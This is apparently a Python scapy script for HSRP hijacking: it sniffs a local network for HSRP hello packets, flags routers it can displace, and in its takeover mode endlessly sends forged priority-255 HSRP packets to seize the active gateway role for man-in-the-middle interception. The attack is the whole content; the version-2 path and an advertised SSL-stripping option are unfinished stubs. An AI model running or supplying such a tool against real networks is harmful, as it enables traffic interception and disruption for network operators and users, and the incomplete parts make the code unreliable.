from scapy.all import *
from argparse import ArgumentParser
from colorama import init, Fore
from ipaddress import IPv4Address

# coloura initialization
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET

# define default HSRP values
IFACE = 'eth0'
MAL_IP = '10.10.3.20'
VERSION = {'224.0.0.2':'1', '224.0.0.102':'2'}

class Packet:
    port = 1985
    multicast_ip = '224.0.0.2' # change to 224.0.0.102 if its HSRP version 2
    auth = 'cisco'
    src_ip = '10.10.3.20'
    virtual_ip = '10.10.3.1'
    priority = 255
    hello_int = 3
    hold_time = 10
    group = 1



def args():
    parser = ArgumentParser()

    parser.add_argument('--sniff', action='store_true', help='Sniff the network for HSRP packets and check if its vulnerable to HSRP hijacking')
    
    subparser = parser.add_subparsers(dest='command')
    takeover = subparser.add_parser('takeover', help='Hijack HSRP and takeover as active router')
    takeover.add_argument('--version', nargs='?', type=int, const=1, default=1, help="Sets the HSRP version. Default is 1")
    takeover.add_argument('--src_ip', nargs='?', type=str)
    takeover.add_argument('--group', nargs='?', type=int)
    takeover.add_argument('--auth', nargs='?', type=str)
    
    parser.add_argument('--sslstrip', action='store_true', help='Conduct SSL Stripping attack')

    return parser.parse_args()



# sniff the network for presence of HSRP packets
def sniff_network():
    print(f"{GREEN}[+] {RESET} Starting HSRP sniffing")
    sniff(timeout=10, iface=IFACE, filter="udp src port 1985 and udp dst port 1985", prn=process_pkt)



# check if HSRP config is vulnerable - i.e. priority < 255 / attacking ip addr higher than active router ip addr
def check_vulnerable(pkt):
    priority = pkt[HSRP].priority
    src_ip = pkt[IP].src

    if priority < 255 or IPv4Address(MAL_IP) > IPv4Address(src_ip):
        return True
    return False



def process_pkt(pkt):
    if pkt.haslayer(HSRP):
        # if state of HSRP is Active and its vulnerable
        if pkt[HSRP].state == 16 and check_vulnerable(pkt):
            print("""
            HSRP version {}\n
            Group number - {}\n
            Source IP - {}\n
            Virtual IP - {}\n
            Priority - {}\n
            Vulnerable - Yes
            """.format(VERSION[pkt[IP].dst], pkt[HSRP].group, pkt[IP].src, pkt[HSRP].virtualIP, pkt[HSRP].priority))
            return ""    
    else:
        print("Vulnerable - No")
        return ""


# attempt to take over as Active HSRP router
def hsrp_v1(pkt):
    ip = IP(src=pkt.src_ip,dst=pkt.multicast_ip)
    udp = UDP(sport=pkt.port,dport=pkt.port)
    hsrp = HSRP(group=pkt.group,priority=pkt.priority,virtualIP=pkt.virtual_ip)
    print(f"{GREEN} [+] {RESET} Attempting HSRP takeover")
    send(ip/udp/hsrp, iface='eth0', inter=3, loop=1)
    # maybe can multithread run sniff_network() function to check if active router is attacker? can do later



def hsrp_v2(pkt):
    return True
"""
    payload_packet = ether/ip/udp
    payload_packet = payload_packet / (struct.pack('B', 1)+struct.pack('B', 40)+struct.pack('B', hsrp_packet.version)+struct.pack('B', 0)+struct.pack('B', hsrp_packet.state)+struct.pack('B', 4)+struct.pack('>H', hsrp_packet.group)+bytearray.fromhex(hsrp_packet.identifier)+struct.pack('>I', priority)+struct.pack('>I', hsrp_packet.hello_interval)+struct.pack('>I', hsrp_packet.dead_interval)+struct.pack('>L', int(ipaddress.IPv4Address(hsrp_packet.virtual_ip)))+(struct.pack('B', 0)*12)+struct.pack('B', 3)+struct.pack('B', 8)+bytearray.fromhex(hsrp_packet.authentication.encode("utf-8").hex())+(struct.pack('B', 0)*(8-len(hsrp_packet.authentication))))
"""



def main():
    arg = args()
    mal_pkt = Packet()
    if arg.sniff:
        sniff_network()
    elif arg.command == 'takeover':
        if arg.version == 1:
            if arg.src_ip != None: mal_pkt.src_ip = arg.src_ip
            if arg.group != None: mal_pkt.group = arg.group
            if arg.auth != None: mal_pkt.auth = arg.auth
            hsrp_v1(mal_pkt)
        elif arg.version == 2:
            hsrp_v2(mal_pkt)

    if arg.sslstrip:
        print('ssltripthnxkeith')

if __name__ == '__main__':
    main()


